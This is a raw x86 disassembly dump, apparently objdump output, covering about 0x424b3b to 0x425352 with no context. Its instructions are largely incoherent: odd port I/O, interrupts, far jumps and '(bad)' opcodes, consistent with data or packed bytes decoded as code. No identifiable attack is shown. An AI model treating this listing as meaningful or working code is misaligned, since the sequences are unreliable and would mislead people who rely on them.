  424b3b:	add    BYTE PTR [eax],al
  424b3d:	leave  
  424b3e:	push   es
  424b3f:	in     al,0x0
  424b41:	add    BYTE PTR [eax],al
  424b43:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424b49:	add    ecx,ecx
  424b4b:	jbe    0x424b52
  424b4d:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424b53:	or     ecx,ecx
  424b55:	jbe    0x424b23
  424b57:	inc    ecx
  424b58:	lahf   
  424b59:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424b5f:	jbe    0x424b86
  424b61:	pusha  
  424b62:	lahf   
  424b63:	xchg   BYTE PTR ds:0x493d76c9,dh
  424b69:	and    DWORD PTR [esi-0x3292c4cb],eax
  424b6f:	int3   
  424b70:	push   es
  424b71:	jo     0x424b73
  424b73:	add    BYTE PTR [eax],al
  424b75:	shr    ebx,cl
  424b77:	xchg   edx,eax
  424b78:	add    DWORD PTR [edx],eax
  424b7a:	scas   eax,DWORD PTR es:[edi]
  424b7b:	or     esp,ecx
  424b7d:	test   DWORD PTR [eax+eax*1+0x0],eax
  424b81:	add    BYTE PTR [esp+eax*1-0x7],ch
  424b85:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424b8b:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424b95:	add    BYTE PTR [eax-0x7c],dh
  424b98:	int    0xb3
  424b9a:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424ba0:	inc    esp
  424ba1:	add    BYTE PTR [eax],al
  424ba3:	add    BYTE PTR [edx+0x70],ah
  424ba6:	add    BYTE PTR [ecx-0x78],dh
  424ba9:	or     dh,BYTE PTR [esi+0x7d]
  424bac:	iret   
  424bad:	jbe    0x424b6c
  424baf:	jo     0x424b7e
  424bb1:	or     BYTE PTR ds:0x808081,ah
  424bb7:	push   eax
  424bb8:	int    0x76
  424bba:	jge    0x424bbc
  424bbc:	icebp  
  424bbd:	int    0x76
  424bbf:	std    
  424bc0:	int    0x8d
  424bc2:	std    
  424bc3:	cmp    edi,DWORD PTR [ecx+0x4]
  424bc6:	add    bh,bh
  424bc8:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424bce:	push   ebx
  424bcf:	ror    DWORD PTR [edx],cl
  424bd1:	jbe    0x424be0
  424bd3:	int    0x8d
  424bd5:	std    
  424bd6:	int    0x76
  424bd8:	std    
  424bd9:	cmp    ecx,DWORD PTR [edi]
  424bdb:	add    al,0x11
  424bdd:	call   ebx
  424bdf:	lods   eax,DWORD PTR ds:[esi]
  424be0:	sub    bl,dl
  424be2:	jmp    0x424b76
  424be4:	push   ebx
  424be5:	jge    0x424bb4
  424be7:	jbe    0x424ba6
  424be9:	inc    ebx
  424bea:	rcl    esp,cl
  424bec:	xchg   esi,eax
  424bed:	or     dh,BYTE PTR [esi+0x75]
  424bf0:	in     al,dx
  424bf1:	das    
  424bf2:	int    0x80
  424bf4:	int    0x8d
  424bf6:	jne    0x424c02
  424bf8:	jbe    0x424bb7
  424bfa:	int    0x76
  424bfc:	mov    ebp,0x4dd4d343
  424c01:	int    0x70
  424c03:	sbb    al,0xcd
  424c05:	mov    bl,0x25
  424c07:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c11:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c1b:	int    0xb3
  424c1d:	sub    eax,0xcd808081
  424c22:	xchg   esi,eax
  424c23:	dec    esp
  424c24:	int    0x62
  424c26:	cmp    al,0x87
  424c28:	xor    DWORD PTR [edx],ecx
  424c2a:	jo     0x424c50
  424c2c:	int    0x76
  424c2e:	stc    
  424c2f:	int    0x8d
  424c31:	stc    
  424c32:	cmp    edi,DWORD PTR [ecx+0x4]
  424c35:	add    bh,bh
  424c37:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c3d:	push   ebx
  424c3e:	ror    DWORD PTR [edx],cl
  424c40:	jbe    0x424c4f
  424c42:	int    0x96
  424c44:	and    al,0x9a
  424c46:	pop    ebx
  424c47:	mov    ebp,0xf5e2
  424c4c:	push   es
  424c4d:	ins    DWORD PTR es:[edi],dx
  424c4e:	das    
  424c4f:	add    eax,0x80808099
  424c54:	add    dh,dl
  424c56:	and    al,0xcd
  424c58:	lock pop ebx
  424c5a:	mov    ebp,0xf52c
  424c5f:	push   es
  424c60:	ins    DWORD PTR es:[edi],dx
  424c61:	das    
  424c62:	add    eax,0x808080c5
  424c67:	int    0x76
  424c69:	and    al,0xcd
  424c6b:	lock int 0xd5
  424c6e:	mov    ebp,0xfbe7
  424c73:	push   es
  424c74:	ins    DWORD PTR es:[edi],dx
  424c75:	das    
  424c76:	add    eax,0x808080d1
  424c7b:	call   0x0:0xf90ebd5b
  424c82:	push   es
  424c83:	ins    DWORD PTR es:[edi],dx
  424c84:	das    
  424c85:	add    eax,0x8080802d
  424c8a:	int    0x8
  424c8c:	and    eax,0x43808081
  424c91:	sbb    al,0xd6
  424c93:	sbb    cl,ch
  424c95:	or     BYTE PTR [ecx],dl
  424c97:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424ca1:	int    0x8d
  424ca3:	dec    esp
  424ca4:	add    BYTE PTR [ecx+0x70005b94],dl
  424caa:	and    al,0xcd
  424cac:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424cb2:	or     ch,0x7d
  424cb5:	cmp    ecx,DWORD PTR [edi]
  424cb7:	add    al,0x11
  424cb9:	call   ebx
  424cbb:	jmp    0x424c4f
  424cbd:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424cc3:	(bad)
  424cc7:	dec    ecx
  424cc8:	and    BYTE PTR [esi-0x778932cb],al
  424cce:	int    0x8d
  424cd0:	mov    ch,cl
  424cd2:	jbe    0x424cf8
  424cd4:	shr    ebx,cl
  424cd6:	xchg   edx,eax
  424cd7:	adc    al,BYTE PTR [edx]
  424cd9:	scas   eax,DWORD PTR es:[edi]
  424cda:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424ce0:	sbb    ch,cl
  424ce2:	ins    BYTE PTR es:[edi],dx
  424ce3:	cmp    al,0xcd
  424ce5:	lea    ebp,[edi+eax*4]
  424ce8:	lds    ecx,FWORD PTR [edx]
  424cea:	outs   dx,BYTE PTR ds:[esi]
  424ceb:	adc    al,0xcd
  424ced:	jbe    0x424d1b
  424cef:	leave  
  424cf0:	add    BYTE PTR [edi-0x327f7f80],0x76
  424cf7:	sub    al,0xa
  424cf9:	pushf  
  424cfa:	test   ch,cl
  424cfc:	jbe    0x424d2e
  424cfe:	int    0x8d
  424d00:	sub    al,0xa
  424d02:	outs   dx,BYTE PTR ds:[esi]
  424d03:	mov    ch,cl
  424d05:	jbe    0x424d1b
  424d07:	int    0x8d
  424d09:	sub    al,0xa
  424d0b:	outs   dx,BYTE PTR ds:[esi]
  424d0c:	dec    esp
  424d0d:	in     al,dx
  424d0e:	adc    al,0xcd
  424d10:	jbe    0x424d36
  424d12:	int    0x6c
  424d14:	cmp    al,0xcd
  424d16:	lea    ebp,[edi+eax*4]
  424d19:	lds    ecx,FWORD PTR [edx]
  424d1b:	outs   dx,BYTE PTR ds:[esi]
  424d1c:	adc    al,0xcd
  424d1e:	jbe    0x424d4c
  424d20:	add    al,0x2c
  424d22:	or     cl,0x76
  424d25:	icebp  
  424d26:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d30:	cmp    ebx,ebp
  424d32:	int    0xc5
  424d34:	arpl   sp,bp
  424d36:	xchg   edx,eax
  424d37:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d3a:	test   al,0xcb
  424d3c:	shl    BYTE PTR [eax+eax*4],cl
  424d3f:	xchg   esi,eax
  424d40:	int    0xed
  424d42:	jno    0x424db5
  424d44:	das    
  424d45:	mov    ebx,0x74cf146e
  424d4a:	mov    BYTE PTR [edi+ebp*1],bl
  424d4d:	mov    ebx,0x9a5b867e
  424d52:	leave  
  424d53:	jbe    0x424d52
  424d55:	dec    ecx
  424d56:	and    DWORD PTR [esi-0x672f5cb],eax
  424d5c:	push   es
  424d5d:	retf   
  424d5e:	aam    0xb4
  424d60:	popa   
  424d61:	shl    DWORD PTR [ecx],1
  424d63:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424d69:	out    0x88,al
  424d6b:	xchg   edx,edi
  424d6d:	pop    esi
  424d6e:	out    0x4c,al
  424d70:	or     BYTE PTR [ebp-0x33],0xdc
  424d74:	mov    BYTE PTR [edi-0x77197806],al
  424d7a:	pop    esi
  424d7b:	out    0x4c,al
  424d7d:	cmp    BYTE PTR [edx-0x33],0x8d
  424d81:	std    
  424d82:	int    0xe6
  424d84:	std    
  424d85:	cmp    edx,DWORD PTR [ebx]
  424d87:	add    al,0xf8
  424d89:	call   ebx
  424d8b:	jmp    0xd41e1ab8
  424d90:	in     al,dx
  424d91:	xchg   edx,eax
  424d92:	push   ebx
  424d93:	cld    
  424d94:	add    al,0xf2
  424d96:	std    
  424d97:	add    al,0xd3
  424d99:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424da0:	sub    BYTE PTR [ebx-0x6],dl
  424da3:	adc    bh,al
  424da5:	dec    ecx
  424da6:	and    DWORD PTR [esi-0x2197ecb],eax
  424dac:	int    0x8d
  424dae:	std    
  424daf:	int    0xe6
  424db1:	std    
  424db2:	cmp    edx,DWORD PTR [ebx]
  424db4:	add    al,0xf8
  424db6:	call   ebx
  424db8:	jmp    0x424d4c
  424dba:	shr    ecx,cl
  424dbc:	sub    BYTE PTR [ebx-0x10],dl
  424dbf:	inc    ebx
  424dc0:	(bad)  
  424dc1:	stc    
  424dc2:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424dc9:	ror    BYTE PTR [eax-0x12326980],cl
  424dcf:	add    al,0xed
  424dd1:	push   eax
  424dd2:	leave  
  424dd3:	jbe    0x424d7a
  424dd5:	mov    edx,0xc98080ac
  424dda:	jbe    0x424d91
  424ddc:	xchg   eax,ecx
  424dde:	add    BYTE PTR [eax-0x68528937],0x40
  424de5:	add    BYTE PTR [eax-0x51068937],0x30
  424dec:	test   BYTE PTR [eax-0x4a028937],al
  424df2:	lods   al,BYTE PTR ds:[esi]
  424df3:	add    BYTE PTR [eax+0x69f176c9],0x53
  424dfa:	add    BYTE PTR [eax-0x76a8937],0x42
  424e01:	add    BYTE PTR [eax-0x78628937],0x80
  424e08:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e0f:	add    BYTE PTR [eax-0x32128937],0x71
  424e16:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e1d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e24:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e2a:	(bad)  
  424e2b:	stc    
  424e2c:	cmp    ebx,edx
  424e2e:	clc    
  424e2f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e35:	repnz popa 
  424e37:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e3d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424e44:	add    BYTE PTR [eax+0x3cded312],0x80
  424e4b:	or     cl,0x76
  424e4e:	cmc    
  424e4f:	icebp  
  424e50:	lea    eax,[eax-0x2893680]
  424e56:	jnp    0x424e2c
  424e58:	add    BYTE PTR [eax+0x18f976c9],0x30
  424e5f:	add    BYTE PTR [eax-0x32068933],0x96
  424e66:	std    
  424e67:	ss dec eax
  424e69:	pushf  
  424e6a:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424e71:	int    0xe3
  424e73:	push   esi
  424e74:	jp     0x424e75
  424e76:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424e7d:	int    0x76
  424e7f:	std    
  424e80:	xchg   DWORD PTR [esi-0x78],esi
  424e83:	int    0x96
  424e85:	std    
  424e86:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424e8c:	xor    ch,cl
  424e8e:	jbe    0x424ea1
  424e90:	int    0x96
  424e92:	in     eax,dx
  424e93:	sbb    BYTE PTR ss:[edi-0x80],cl
  424e97:	cmp    BYTE PTR [ebx],0xd2
  424e9a:	int    0x96
  424e9c:	mov    ebp,0xe261d253
  424ea1:	fadd   DWORD PTR [eax-0x320ecc80]
  424ea7:	jbe    0x424e5e
  424ea9:	xchg   DWORD PTR [ebx],edx
  424eab:	popa   
  424eac:	fist   WORD PTR [eax+eax*4-0x80]
  424eb0:	xor    esi,ecx
  424eb2:	xchg   DWORD PTR [esi-0x5a893253],edx
  424eb8:	int    0xd6
  424eba:	xor    ch,cl
  424ebc:	out    0x9d,al
  424ebe:	adc    bh,bl
  424ec0:	mov    DWORD PTR [ecx-0x80],esi
  424ec3:	sub    BYTE PTR [ebx],0xf1
  424ec6:	int    0x76
  424ec8:	xchg   ebp,eax
  424ec9:	adc    bh,bl
  424ecb:	mov    dh,0x2c
  424ecd:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424ed4:	clc    
  424ed5:	int    0x96
  424ed7:	icebp  
  424ed8:	push   esi
  424ed9:	out    0x1e,al
  424edb:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424ee2:	icebp  
  424ee3:	adc    dh,bl
  424ee5:	pop    es
  424ee6:	push   edx
  424ee7:	add    BYTE PTR [eax+0x72f9943],0x63
  424eee:	add    BYTE PTR [eax],al
  424ef0:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424ef6:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424efd:	pop    ebx
  424efe:	cwde   
  424eff:	call   0x8043:0xd9ed76c9
  424f06:	or     cl,0x76
  424f09:	adc    DWORD PTR [edx+0x7e],esi
  424f0c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f13:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f1a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f21:	add    BYTE PTR [eax-0x275a8937],0x58
  424f28:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f2f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f36:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f3d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424f44:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424f4b:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424f52:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424f59:	add    BYTE PTR [eax-0x44f28937],0x4d
  424f60:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424f67:	add    BYTE PTR [eax-0x32528933],0x8d
  424f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f6f:	dec    ebp
  424f70:	bound  ebp,QWORD PTR [ebx]
  424f72:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424f79:	dec    ebp
  424f7a:	pop    ds
  424f7b:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424f81:	pop    edi
  424f82:	xchg   ecx,eax
  424f83:	mov    bh,0x7e
  424f85:	stc    
  424f86:	xor    edi,DWORD PTR [ebp-0x33]
  424f89:	jbe    0x424f88
  424f8b:	int    0x96
  424f8d:	stc    
  424f8e:	sub    edx,edx
  424f90:	int    0x96
  424f92:	cmc    
  424f93:	dec    ebp
  424f94:	inc    edi
  424f95:	outs   dx,DWORD PTR ds:[esi]
  424f96:	add    BYTE PTR [eax-0x69322dcd],0x11
  424f9d:	xor    edx,edx
  424f9f:	int    0x96
  424fa1:	in     eax,dx
  424fa2:	push   ebx
  424fa3:	sar    BYTE PTR [ebx],cl
  424fa5:	fisubr DWORD PTR [ecx-0x27]
  424fa8:	ret    
  424fa9:	add    BYTE PTR [eax],al
  424fab:	clc    
  424fac:	test   ebp,0x72c34c96
  424fb2:	push   ds
  424fb3:	add    BYTE PTR [eax+0x76cdf133],0xbd
  424fba:	int    0xd6
  424fbc:	mov    ch,0x33
  424fbe:	leave  
  424fbf:	das    
  424fc0:	sar    DWORD PTR [ecx+0x69],1
  424fc3:	fisttp DWORD PTR [edx]
  424fc5:	xchg   ecx,eax
  424fc6:	mov    ebx,ebp
  424fc8:	popa   
  424fc9:	add    BYTE PTR [eax-0x6a893680],0x9b
  424fd0:	push   esp
  424fd1:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  424fd8:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  424fdf:	add    BYTE PTR [eax-0x7e5a8937],0x80
  424fe6:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  424fed:	pop    ebp
  424fee:	call   0xcdf4:0xf880806f
  424ff5:	xchg   esi,eax
  424ff6:	lods   eax,DWORD PTR ds:[esi]
  424ff7:	int    0xa6
  424ff9:	mov    BYTE PTR [ebx-0x2e],dl
  424ffc:	int    0x96
  424ffe:	popf   
  424fff:	xor    edx,edx
  425001:	int    0x96
  425003:	xchg   ebp,eax
  425004:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425006:	push   eax
  425007:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42500e:	mov    BYTE PTR [eax+0x2c],bl
  425011:	ret    0xafd
  425014:	jbe    0x424fab
  425016:	int    0x76
  425018:	icebp  
  425019:	int    0x96
  42501b:	or     eax,0xf3f7f534
  425020:	int    0x96
  425022:	xchg   ebp,eax
  425023:	xor    al,0x23
  425025:	inc    esp
  425026:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42502a:	inc    esi
  42502b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425032:	rol    esi,0x80
  425035:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42503c:	cmp    ebx,edx
  42503e:	clc    
  42503f:	hlt    
  425040:	int    0x96
  425042:	gs mov edi,0xc3d9
  425048:	ss aaa 
  42504a:	push   esi
  42504b:	add    BYTE PTR [eax+0xc56d233],0x6d
  425052:	add    BYTE PTR [eax],al
  425054:	xchg   DWORD PTR [ebp-0x33],edi
  425057:	jbe    0x425056
  425059:	int    0x96
  42505b:	stc    
  42505c:	sub    edx,edx
  42505e:	int    0x96
  425060:	cmc    
  425061:	dec    ebp
  425062:	inc    edi
  425063:	outs   dx,DWORD PTR ds:[esi]
  425064:	add    BYTE PTR [eax-0x69322dcd],0x11
  42506b:	xor    edx,edx
  42506d:	int    0x96
  42506f:	in     eax,dx
  425070:	push   ebx
  425071:	sar    BYTE PTR [ebx],cl
  425073:	(bad)  
  425075:	hlt    
  425076:	int    0x96
  425078:	dec    esp
  425079:	xor    esi,ecx
  42507b:	int    0x76
  42507d:	mov    ebp,0x33b5a6cd
  425082:	leave  
  425083:	das    
  425084:	rol    ebp,1
  425086:	int    0xdb
  425088:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  42508e:	das    
  42508f:	pop    es
  425090:	pop    esp
  425091:	add    BYTE PTR [eax],al
  425093:	add    BYTE PTR [edx-0x2d349c58],ch
  425099:	mov    BYTE PTR [eax+0x4edcd96],al
  42509f:	in     eax,dx
  4250a0:	jo     0x42506b
  4250a2:	jbe    0x425074
  4250a4:	xchg   ecx,eax
  4250a5:	aaa    
  4250a6:	ficom  WORD PTR [ebx]
  4250a8:	pop    ebp
  4250a9:	mov    ebp,0xa25230a
  4250ae:	jbe    0x425105
  4250b0:	leave  
  4250b1:	jbe    0x425110
  4250b3:	mov    esi,0xa13de37
  4250b8:	jbe    0x42511f
  4250ba:	leave  
  4250bb:	jbe    0x42512a
  4250bd:	fidiv  WORD PTR [edi]
  4250bf:	ficom  WORD PTR [ebx]
  4250c1:	or     dh,BYTE PTR [esi+0x75]
  4250c4:	pop    ebx
  4250c5:	leave  
  4250c6:	jbe    0x425145
  4250c8:	scas   al,BYTE PTR es:[edi]
  4250c9:	aaa    
  4250ca:	ficom  WORD PTR [ebx]
  4250cc:	or     dh,BYTE PTR [esi+0xd]
  4250cf:	cwde   
  4250d0:	call   0xde37:0x96f176c9
  4250d7:	adc    ecx,DWORD PTR [edx]
  4250d9:	jbe    0x425070
  4250db:	cmp    ebx,edx
  4250dd:	cmp    eax,DWORD PTR [eax]
  4250df:	pop    edi
  4250e0:	dec    ecx
  4250e1:	and    DWORD PTR [esi-0x628936cb],eax
  4250e7:	out    0x37,al
  4250e9:	ficom  WORD PTR [ebx]
  4250eb:	jp     0x4250f7
  4250ed:	jbe    0x425094
  4250ef:	int    0xd3
  4250f1:	or     dl,BYTE PTR [esi-0x4a19f513]
  4250f7:	iret   
  4250f8:	xchg   ecx,eax
  4250f9:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425100:	push   ebx
  425101:	ror    bh,cl
  425103:	je     0x4250cc
  425105:	ror    ch,1
  425107:	xor    ch,cl
  425109:	pushf  
  42510a:	test   BYTE PTR [edi],ch
  42510c:	inc    ebp
  42510d:	loop   0x4250a1
  42510f:	shr    esp,cl
  425111:	xchg   edx,eax
  425112:	int    0x1c
  425114:	int    0x6c
  425116:	test   BYTE PTR [ebx],bh
  425118:	ins    DWORD PTR es:[edi],dx
  425119:	adc    bh,bl
  42511b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42511c:	mov    esi,0xf1534229
  425121:	or     dl,BYTE PTR [esi-0x6893207]
  425127:	xchg   DWORD PTR [ebp-0x2d],ebp
  42512a:	in     eax,0x28
  42512c:	inc    ebx
  42512d:	jbe    0x42517b
  42512f:	das    
  425130:	or     BYTE PTR [edi-0x327f7f80],bh
  425136:	jbe    0x425131
  425138:	add    al,0xb6
  42513a:	mov    ebp,0x11e60a80
  42513f:	int    0x76
  425141:	stc    
  425142:	push   es
  425143:	ins    DWORD PTR es:[edi],dx
  425144:	aam    0xb6
  425146:	cmp    ebp,DWORD PTR [ebp+0xa]
  425149:	out    0xf5,al
  42514b:	int    0x96
  42514d:	mov    ebp,0xcf88a6cd
  425152:	fs xor ch,cl
  425155:	xchg   esi,eax
  425156:	mov    BYTE PTR [edi-0x5269f527],al
  42515c:	retf   0x922
  42515f:	xchg   esi,eax
  425160:	add    ch,cl
  425162:	xchg   esi,eax
  425163:	stc    
  425164:	xchg   ecx,ebx
  425166:	retf   0x2014
  425169:	int    0xa6
  42516b:	lods   eax,DWORD PTR ds:[esi]
  42516c:	or     DWORD PTR [ebx],ebx
  42516e:	retf   0x96
  425171:	int    0xa6
  425173:	stc    
  425174:	xchg   ecx,esp
  425176:	int    0xe6
  425178:	mov    BYTE PTR [ecx],cl
  42517a:	adc    al,0x43
  42517c:	int    0x96
  42517e:	cmc    
  42517f:	ins    BYTE PTR es:[edi],dx
  425180:	add    al,0xea
  425182:	std    
  425183:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  425189:	push   ebx
  42518a:	sar    BYTE PTR [ebx],cl
  42518c:	ror    DWORD PTR [edx],cl
  42518e:	jbe    0x425185
  425190:	push   ecx
  425191:	(bad)  
  425192:	cmc    
  425193:	int    0x96
  425195:	cmc    
  425196:	add    al,0x11
  425198:	call   ebx
  42519a:	repz xchg edx,eax
  42519c:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251a2:	xchg   esi,eax
  4251a3:	stc    
  4251a4:	inc    ebx
  4251a5:	rol    BYTE PTR [edx+0x7a003ba7],cl
  4251ab:	int    0x76
  4251ad:	adc    ebp,ecx
  4251af:	xchg   esi,eax
  4251b0:	stc    
  4251b1:	int    0xa6
  4251b3:	mov    ebp,0xcffdad04
  4251b8:	test   cl,dh
  4251ba:	int    0x96
  4251bc:	stc    
  4251bd:	iret   
  4251be:	adc    al,0x5b
  4251c0:	int    0xa6
  4251c2:	dec    esp
  4251c3:	shl    ebx,cl
  4251c5:	sub    BYTE PTR [ebx-0x2e],dl
  4251c8:	cmp    edx,ebx
  4251ca:	or     dh,BYTE PTR [esi+0x11]
  4251cd:	push   ecx
  4251ce:	(bad)  
  4251cf:	adc    ebp,ecx
  4251d1:	xchg   esi,eax
  4251d2:	adc    DWORD PTR [ecx+edx*1],eax
  4251d5:	call   ebx
  4251d7:	repz xchg edx,eax
  4251d9:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251df:	xchg   esi,eax
  4251e0:	stc    
  4251e1:	xchg   edx,ebx
  4251e3:	xor    esp,edx
  4251e5:	or     dh,BYTE PTR [esi-0x43]
  4251e8:	inc    ebx
  4251e9:	lds    ebp,FWORD PTR [edi]
  4251eb:	pop    es
  4251ec:	outs   dx,DWORD PTR ds:[esi]
  4251ed:	add    BYTE PTR [eax],al
  4251ef:	add    ch,cl
  4251f1:	jbe    0x4251e0
  4251f3:	int    0x96
  4251f5:	mov    ch,0x4
  4251f7:	jmp    0xd384:0xd2046cfd
  4251fe:	mov    ebp,0x3bd25328
  425203:	ror    ebp,cl
  425205:	popf   
  425206:	int    0xf1
  425208:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42520e:	in     eax,0x28
  425210:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425216:	or     ah,BYTE PTR [esi-0x12697613]
  42521c:	add    al,0xe6
  42521e:	in     eax,dx
  42521f:	xchg   BYTE PTR [edi],ch
  425221:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425227:	test   al,0x63
  425229:	retf   
  42522a:	ror    BYTE PTR [eax-0x12326980],cl
  425230:	add    al,0xed
  425232:	adc    al,0xcd
  425234:	jbe    0x4251be
  425236:	leave  
  425237:	jbe    0x42524a
  425239:	dec    ecx
  42523a:	and    DWORD PTR [esi-0x28936cb],eax
  425240:	inc    ecx
  425241:	and    DWORD PTR [esi+0x5b80cd35],eax
  425247:	cwde   
  425248:	or     dh,BYTE PTR [esi-0x7]
  42524b:	leave  
  42524c:	jbe    0x425243
  42524e:	into   
  42524f:	and    DWORD PTR [esi+0x76c99a35],eax
  425255:	in     eax,dx
  425256:	inc    esi
  425257:	sbb    DWORD PTR [ebp-0x22932de],esi
  42525d:	int    0x8d
  42525f:	std    
  425260:	sar    bh,0x5d
  425263:	shl    DWORD PTR [ecx],1
  425265:	xchg   BYTE PTR ds:0xd3f03baa,dh
  42526b:	repnz sub BYTE PTR [ebx],bh
  42526e:	adc    ebx,edx
  425270:	out    dx,eax
  425271:	xchg   edx,eax
  425272:	push   ebx
  425273:	add    cl,ch
  425275:	lea    edx,[ecx]
  425277:	int    0x96
  425279:	adc    DWORD PTR [ebx],edi
  42527b:	jge    0x4252b8
  42527d:	(bad)  
  42527f:	jmp    0x425213
  425281:	shr    edx,cl
  425283:	sub    BYTE PTR [ebx+0x13],dl
  425286:	das    
  425287:	rol    DWORD PTR [edx],1
  425289:	jmp    0x42522a
  42528b:	add    BYTE PTR [eax-0x6723280],0xcd
  425292:	xchg   esi,eax
  425293:	stc    
  425294:	cmp    ebx,ecx
  425296:	shr    edx,cl
  425298:	sub    BYTE PTR [ebx],bh
  42529a:	jge    0x42526f
  42529c:	jmp    0x425230
  42529e:	push   ebx
  42529f:	adc    ecx,ebp
  4252a1:	xchg   esi,eax
  4252a2:	std    
  4252a3:	int    0xa6
  4252a5:	std    
  4252a6:	cmp    esi,ecx
  4252a8:	cmp    esp,ecx
  4252aa:	shl    ebx,cl
  4252ac:	xchg   edx,eax
  4252ad:	shl    ebp,cl
  4252af:	sub    BYTE PTR [ebx-0x2b],dl
  4252b2:	push   es
  4252b3:	adc    ecx,ebp
  4252b5:	xchg   esi,eax
  4252b6:	stc    
  4252b7:	int    0x8d
  4252b9:	stc    
  4252ba:	aam    0x58
  4252bc:	cmp    esi,eax
  4252be:	shl    edx,cl
  4252c0:	sub    BYTE PTR [ebx],bh
  4252c2:	icebp  
  4252c3:	shl    ebx,cl
  4252c5:	xchg   edx,eax
  4252c6:	push   ebx
  4252c7:	jecxz  0x425296
  4252c9:	(bad)  
  4252ca:	std    
  4252cb:	int    0xa6
  4252cd:	std    
  4252ce:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252d1:	loope  0x4252a6
  4252d3:	jmp    0x425267
  4252d5:	shl    ebp,cl
  4252d7:	sub    BYTE PTR [ebx+0xc],dl
  4252da:	aad    0xf3
  4252dc:	int    0x8d
  4252de:	in     eax,dx
  4252df:	int    0xa6
  4252e1:	in     eax,dx
  4252e2:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252e5:	loope  0x4252ba
  4252e7:	jmp    0x42527b
  4252e9:	shl    ebp,cl
  4252eb:	sub    BYTE PTR [ebx+0xc],dl
  4252ee:	cmp    esp,ebx
  4252f0:	in     al,dx
  4252f1:	sub    al,0x3b
  4252f3:	lock shl edx,cl
  4252f6:	sub    BYTE PTR [ebx],bh
  4252f8:	icebp  
  4252f9:	shl    ebx,cl
  4252fb:	xchg   edx,eax
  4252fc:	push   ebx
  4252fd:	jecxz  0x4252cc
  4252ff:	(bad)  
  425300:	std    
  425301:	int    0xa6
  425303:	std    
  425304:	cmp    edi,DWORD PTR [ebp+0x3b]
  425307:	loope  0x4252dc
  425309:	jmp    0x42529d
  42530b:	shl    ebp,cl
  42530d:	sub    BYTE PTR [ebx+0xc],dl
  425310:	aad    0xf3
  425312:	or     dl,BYTE PTR [esi-0x2723207]
  425318:	int    0x96
  42531a:	std    
  42531b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42531e:	(bad)  
  425320:	jmp    0x4252b4
  425322:	shr    edx,cl
  425324:	sub    BYTE PTR [ebx+0x13],dl
  425327:	xchg   DWORD PTR [edx],eax
  425329:	int    0x8d
  42532b:	cmc    
  42532c:	int    0x96
  42532e:	cmc    
  42532f:	cmp    ebx,ecx
  425331:	cmp    edi,DWORD PTR [ebp-0x2d]
  425334:	jmp    0x1353:0x92ebd328
  42533b:	int    0x96
  42533d:	std    
  42533e:	int    0xa6
  425340:	std    
  425341:	cmp    esi,ecx
  425343:	cmp    esp,ecx
  425345:	shl    ebp,cl
  425347:	sub    bl,dl
  425349:	repz xchg edx,eax
  42534b:	push   ebx
  42534c:	aad    0x33
  42534e:	adc    eax,DWORD PTR [ebx+0x2]
  425351:	das    
  425352:	pop    es
